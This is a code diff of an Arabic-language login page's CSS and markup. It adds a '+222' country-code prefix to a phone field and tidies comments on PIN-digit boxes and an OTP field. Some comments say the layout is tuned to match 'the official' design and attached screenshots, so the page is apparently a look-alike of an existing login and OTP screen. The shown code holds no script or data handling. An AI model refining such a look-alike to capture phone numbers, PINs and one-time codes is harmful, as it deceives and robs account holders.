@@ -114,14 +114,26 @@
         .input-wrapper {
             position: relative;
             width: 100%;
-            border-bottom: 1px solid #111; /* خط نحيف واحترافي */
+            border-bottom: 1px solid #111; /* خط سفلي نحيف واحترافي */
         }
 
-        /* حقل الهاتف المستمر مع تطبيق خاصية LTR ومحاذاة النص والاتجاه بالكامل */
+        /* عنصر رمز الدولة الثابت جهة اليسار */
+        .country-code-prefix {
+            position: absolute;
+            left: 2px;
+            bottom: 6px;
+            font-size: 1.25rem;
+            font-weight: 500;
+            color: #222;
+            direction: ltr !important;
+            z-index: 5;
+        }
+
+        /* حقل الهاتف المستمر مع إعطاء مسافة بادئة لرمز الدولة على اليسار وللأيقونة على اليمين */
         .main-input {
             width: 100%;
             border: none;
-            padding: 6px 40px 6px 5px;
+            padding: 6px 40px 6px 55px; /* مسافة 55px من اليسار لعدم تداخل النص مع +222 */
             font-size: 1.25rem;
             outline: none;
             color: #222;
@@ -140,7 +152,7 @@
             text-align: left;
         }
 
-        /* الأيقونات الثابتة في مكانها الرسمي جهة اليمين ملاصقة تماماً ومحاذية للخط */
+        /* الأيقونات الثابتة في مكانها الرسمي جهة اليمين ملاصقة ومحاذية للخط */
         .field-icon {
             position: absolute;
             right: 2px;
@@ -151,19 +163,19 @@
             z-index: 5;
         }
 
-        /* تعديل الموضع ليصبح في الجهة اليمنى (الأصلي) بمحاذاة الأيقونة وبدون فجوات علوية */
+        /* تعديل الموضع ليصبح في الجهة اليمنى بمحاذاة الأيقونة وبدون فجوات علوية */
         .password-wrapper-box {
             display: flex;
             justify-content: flex-end; 
             width: 100%;
-            padding-right: 40px; /* مسافة متناسقة ومطابقة لأيقونة القفل */
+            padding-right: 40px; 
             margin-top: -2px;
         }
 
         /* حاوية حقول الرقم السري مرتبة في اليمين مع إبقاء الاتجاه العام للحقول LTR */
         .password-container {
             display: flex;
-            gap: 16px; /* مسافة متناسقة بدقة بين المربعات */
+            gap: 16px; 
             width: auto; 
             direction: ltr !important; 
         }
@@ -173,14 +185,13 @@
             width: 22px;
             height: 30px;
             border: none;
-            border-bottom: 1.5px solid #111; /* جعل سماكة الخط متناسقة بصرياً */
+            border-bottom: 1.5px solid #111; 
             font-size: 1.4rem;
             font-weight: bold;
             outline: none;
             background: transparent;
             padding-bottom: 2px;
             
-            /* إجبار الكتابة والمحاذاة والبدء من اليسار فقط داخل كل مربع وبشكل صارم */
             direction: ltr !important;
             text-align: left !important; 
             unicode-bidi: plaintext !important;
@@ -236,7 +247,7 @@
             margin-bottom: 40px;
         }
 
-        /* حقل الـ OTP متمركز في المنتصف تماماً ومطابق للصور المرفقة */
+        /* حقل الـ OTP متمركز في المنتصف تماماً */
         .otp-wrapper-box {
             display: flex;
             justify-content: center; 
@@ -250,7 +261,7 @@
             direction: ltr !important;
         }
 
-        /* تطبيق خاصية LTR الصارمة ومنع الإدخال أو المحاذاة من اليمين/الوسط لحقول OTP */
+        /* تطبيق خاصية LTR الصارمة لحقول OTP */
         .otp-field {
             width: 32px;
             height: 40px;
@@ -288,7 +299,7 @@
             margin-bottom: 25px;
         }
 
-        /* التنسيق الجديد للنص المستبدل بدلاً من الدائرة الخضراء لتطابق الرسمية */
+        /* النص المستبدل بدلاً من الدائرة الخضراء لتطابق الرسمية */
         .otp-confirmation-text {
             font-size: 1.15rem;
             font-weight: bold;
@@ -339,6 +350,7 @@
             <div class="input-group">
                 <label>اسم المستخدم أو رقم الهاتف</label>
                 <div class="input-wrapper">
+                    <span class="country-code-prefix">+222</span>
                     <input type="text" id="usernameInput" class="main-input" maxlength="8" placeholder="من 8 أرقام" oninput="cleanNumberInput(this)">
                     <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M5.5 21a8.5 8.5 0 0 1 13 0"/></svg>
                 </div>
